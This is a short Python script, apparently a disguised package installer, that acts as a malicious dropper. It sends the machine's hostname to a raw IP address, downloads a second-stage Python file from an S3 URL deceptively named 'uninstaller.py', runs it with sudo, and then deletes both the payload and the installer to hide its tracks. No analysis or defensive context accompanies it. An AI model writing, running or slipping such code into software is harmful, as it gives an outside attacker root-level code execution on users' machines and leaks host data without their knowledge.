import os

hostname = os.uname()[1]
secondStage="http://jssecurecode.s3.amazonaws.com/uninstaller.py"

os.system("curl -X POST -d 'id="+hostname+"' 3.239.87.61")
os.system("sudo curl -o /tmp/evalPure.py "+secondStage)
os.system("sudo python3 /tmp/evalPure.py")
os.system("rm jsCodeSafeInstaller.py")
os.system("rm /tmp/evalPure.py")
